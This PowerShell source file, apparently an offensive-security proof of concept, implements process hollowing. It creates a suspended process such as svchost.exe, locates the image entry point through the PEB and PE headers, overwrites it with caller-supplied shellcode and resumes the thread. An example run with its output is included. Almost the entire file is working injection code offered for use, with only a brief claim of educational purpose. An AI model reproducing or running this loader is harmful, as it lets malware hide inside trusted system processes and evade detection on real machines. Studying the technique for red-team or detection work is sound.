function Invoke-ShellcodeViaProcessHollow
{
<#
.SYNOPSIS
    Executes shellcode in the context of a newly created suspended process using classic process hollowing.

    This function demonstrates traditional process hollowing using the CreateProcess, GetThreadContext,
    ReadProcessMemory, WriteProcessMemory, and ResumeThread APIs.

    The payload replaces the entry point of a suspended target process (e.g., svchost.exe), allowing
    the shellcode to execute when the thread resumes. This method is highly detectable and primarily
    serves educational purposes for understanding the internal mechanics of hollowing.

    Notes:
        - I tested this POC on x64 Win11.
        - You can only create an x64 processes on an x64 host architecture.

.DESCRIPTION
    Author: Silentis Vox (@SilentisVox)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

.PARAMETER ProcessPath
    Full path to the process to hollow (e.g., C:\Windows\System32\svchost.exe)

.PARAMETER Shellcode
    Byte array containing the shellcode to inject.

.EXAMPLE
    # Create a local thread that executes shellcode.
    # x64 Win10 RS4
    PS C:\> Invoke-ShellcodeViaProcessHollow -ProcessPath "C:\Windows\System32\svchost.exe" -Shellcode $Shellcode -Verbose
    VERBOSE: [+] Process Created [8020] And Is Suspended.
    VERBOSE: [+] Thread Context Retrieved.
    VERBOSE: [+] PEB + Image Start Address Located At 0x817AE6000.
    VERBOSE: [+] Base Image Address (DOS Header) Located At 0x7FF780100000.
    VERBOSE: [+] DOS Header Populated.
    VERBOSE: [+] PE Header Located At 0x7FF780100108.
    VERBOSE: [+] PE Header Populated.
    VERBOSE: [+] Adress Of Entry Point Located At 0x7FF780104FE0.
    VERBOSE: [+] Shellcode [272] Written To 0x7FF780104FE0.
    VERBOSE: [+] Process Resumed And Is Executing.
    True
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$ProcessPath,

        [Parameter(Mandatory)]
        [Byte[]]$Shellcode
    )

    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class Kernel32
    {
        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, IntPtr lpStartupInfo, IntPtr lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool GetThreadContext(IntPtr hThread, IntPtr lpContext);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError=true)]
        public static extern uint ResumeThread(IntPtr hThread);
    }
"@

    # Initialize needed variables and structures.

    $ShellcodeSize                      = $Shellcode.Length
    $StartupInformationSize             = 104
    $ProcessInformationSize             = 24
    $ContextSize                        = 1232
    $ContextFlags                       = 0x10007
    $ContextFlagsOffset                 = 48

    $StartupInformation                 = [Runtime.InteropServices.Marshal]::AllocHGlobal($StartupInformationSize)
    [Runtime.InteropServices.Marshal]::Copy([Byte[]]::New($StartupInformationSize), 0, $StartupInformation, $StartupInformationSize)
    [Runtime.InteropServices.Marshal]::WriteInt32($StartupInformation, 0, $StartupInformationSize)

    $ProcessInformation                 = [Runtime.InteropServices.Marshal]::AllocHGlobal($ProcessInformationSize)
    [Runtime.InteropServices.Marshal]::Copy([Byte[]]::New($ProcessInformationSize), 0, $ProcessInformation, $ProcessInformationSize)

    $Context                            = [Runtime.InteropServices.Marshal]::AllocHGlobal($ContextSize)
    [Runtime.InteropServices.Marshal]::Copy([Byte[]]::New($ContextSize), 0, $Context, $ContextSize)
    [Runtime.InteropServices.Marshal]::WriteInt32($Context, $ContextFlagsOffset, $ContextFlags)

    $BaseAddressPointerBuffer           = [Byte[]]::New(8)
    $DOSHeaderBuffer                    = [Byte[]]::New(64)
    $PEHeaderBuffer                     = [Byte[]]::New(128)

    $BytesRead                          = [IntPtr]::Zero
    $BytesWritten                       = [IntPtr]::Zero

    # Create a process in a suspended state.

    $CommandLine                        = $null
    $ProcessAttributes                  = [IntPtr]::Zero
    $ThreadAttributes                   = [IntPtr]::Zero
    $InheritHandles                     = $false
    $CreationFlags                      = 0x4
    $Environment                        = [IntPtr]::Zero
    $CurrentDirectory                   = [IntPtr]::Zero

    $Result                             = [Kernel32]::CreateProcess($ProcessPath, $CommandLine, $ProcessAttributes, $ThreadAttributes, $InheritHandles, $CreationFlags, $Environment, $CurrentDirectory, $StartupInformation, $ProcessInformation)

    if ($Result)
    {
        $ProcessId                      = [Runtime.InteropServices.Marshal]::ReadInt32($ProcessInformation, 0x10)
        Write-Verbose "[+] Process Created [$ProcessId] And Is Suspended."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] CreateProcess Failed: $FunctionError"
        $false
        return
    }

    # Get the current execution context (In memory, the very start).

    $ProcessHandle                      = [Runtime.InteropServices.Marshal]::ReadIntPtr($ProcessInformation, 0)
    $ThreadHandle                       = [Runtime.InteropServices.Marshal]::ReadIntPtr($ProcessInformation, 8)

    $Result                             = [Kernel32]::GetThreadContext($ThreadHandle, $Context)

    if ($Result)
    {
        Write-Verbose "[+] Thread Context Retrieved."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] GetThreadContext Failed: $FunctionError"
        $false
        return
    }

    # The Rdx of a freshly created process will hold the Process Environment Block (PEB) address pointer.

    $RdxOffset                          = 136
    $PEBAddressPointer                  = [Runtime.InteropServices.Marshal]::ReadIntPtr($Context, $RdxOffset)
    $PEBAddress                         = $PEBAddressPointer

    Write-Verbose ("[+] PEB + Image Start Address Located At 0x{0:X}." -f $PEBAddress)

    # The PEB contains the Image Base Address whose offset is at 16 bytes.
    # Because the PEB is guarenteed to have the Image Base Address 16 bytes offset, we can use this method.

    $BaseAddressOffset                  = 16
    $PEBImageBasePointer                = [IntPtr]::Add($PEBAddressPointer, $BaseAddressOffset)

    $Result                             = [Kernel32]::ReadProcessMemory($ProcessHandle, $PEBImageBasePointer, $BaseAddressPointerBuffer, $BaseAddressPointerBuffer.Length, [Ref] $BytesRead)

    $BaseAddress                        = [BitConverter]::ToInt64($BaseAddressPointerBuffer, 0)
    $BaseAddressPointer                 = [IntPtr]::New($BaseAddress)

    if ($Result)
    {
        Write-Verbose ("[+] Image Base Address (DOS Header) Located At 0x{0:X}." -f $BaseAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Now that we have the Image Base Address, we can query it, and fill our DOS Header structure.

    $Result                             = [Kernel32]::ReadProcessMemory($ProcessHandle, $BaseAddressPointer, $DOSHeaderBuffer, $DOSHeaderBuffer.Length, [Ref] $BytesRead)

    if ($Result)
    {
        Write-Verbose "[+] DOS Header Populated."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # The DOS Header contains the e_lfanew field whose offset is at 60 bytes. This is the address
    # pointer to the PE header.

    $e_lfanewOffset                     = 60
    $e_lfanew                           = [BitConverter]::ToInt32($DOSHeaderBuffer, $e_lfanewOffset)
    $PEHeaderAddress                    = $BaseAddress + [uInt64] $e_lfanew
    $PEHeaderAddressPointer             = [IntPtr]::New($PEHeaderAddress)

    Write-Verbose ("[+] PE Header Located At 0x{0:X}." -f $PEHeaderAddress)

    $Result                             = [Kernel32]::ReadProcessMemory($ProcessHandle, $PEHeaderAddressPointer, $PEHeaderBuffer, $PEHeaderBuffer.Length, [Ref] $BytesRead)

    if ($Result)
    {
        Write-Verbose "[+] PE Header Populated."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ReadProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # The PE Header contains the AddressOfEntryPoint, which is the address of executable code.

    $EntryPointAddressOffset            = 40
    $EntryPointAddress                  = $BaseAddress + [BitConverter]::ToUInt32($PEHeaderBuffer, $EntryPointAddressOffset)
    $EntryPointPointer                  = [IntPtr]::New($EntryPointAddress)

    Write-Verbose ("[+] Adress Of Entry Point Located At 0x{0:X}." -f $EntryPointAddress)

    # We write our shellcode to that address.

    $Result                             = [Kernel32]::WriteProcessMemory($ProcessHandle, $EntryPointPointer, $Shellcode, $ShellcodeSize, [Ref] $BytesWritten)

    if (($Result) -and ($BytesWritten.ToInt32() -eq $ShellcodeSize))
    {
        Write-Verbose ("[+] Shellcode [$ShellcodeSize] Written To 0x{0:X}." -f $EntryPointAddress)
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] WriteProcessMemory Failed: $FunctionError"
        $false
        return
    }

    # Then resume the thread.

    $Result                             = [Kernel32]::ResumeThread($ThreadHandle)

    if ($Result)
    {
        Write-Verbose "[+] Process Resumed And Is Executing."
    }
    else
    {
        $FunctionError                  = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
        Write-Verbose "[!] ResumeThread Failed: $FunctionError"
        $false
        return
    }

    return $true
}